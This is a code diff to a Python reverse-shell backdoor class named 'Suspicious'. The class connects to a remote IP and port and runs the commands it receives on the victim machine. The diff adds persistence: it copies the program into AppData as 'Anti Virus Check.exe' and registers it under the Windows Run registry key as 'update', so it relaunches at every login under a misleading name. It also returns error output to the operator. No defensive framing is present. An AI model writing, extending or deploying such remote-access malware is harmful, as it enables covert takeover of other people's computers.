@@ -13,11 +13,15 @@ import subprocess
 
 class Suspicious:
     def __init__(self, ip, port):
+        self.restart_control()
         self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-        # self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
-        # platform = {'aix': "AIX", 'linux': "Linux", 'win32':'Windows', 'cygwin': "Windows.Cygwin", 'darwin': "MacOS"}
-        # self.connetion.send(f"[+] Connected to {platform[sys.platform]} operating system")
+    
+    def restart_control(self):
+        piece_of_cake = os.environ['appdata'] + "\\Anti Virus Check.exe"
+        if not os.path.exists(piece_of_cake):
+            shutil.copy(sys.executable, piece_of_cake)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"', shell=True)
 
     def handleErrorDataSendType(self, error):
         return str(error)
@@ -94,8 +98,9 @@ class Suspicious:
             try:
                 data_received = self.receive_data()
                 if data_received[0].lower() == 'exit':
-                    self.connetion.close()
-                    sys.exit()
+                    break
+                    # self.connetion.close()
+                    # sys.exit()
                 elif data_received[0] == 'what':
                     command_result = self.getSystemInfo()
                 elif data_received[0].lower() == 'cd' and len(data_received) >1:
@@ -114,6 +119,7 @@ class Suspicious:
             # except subprocess.CalledProcessError as error:
                 # self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
             except Exception as error:
+                self.send_data(str(error))
                 self.send_data("---- [=] Error while executing command [=] ----")
                 # self.send_data("---- [=] Connection is still intact though [=] ----")
 
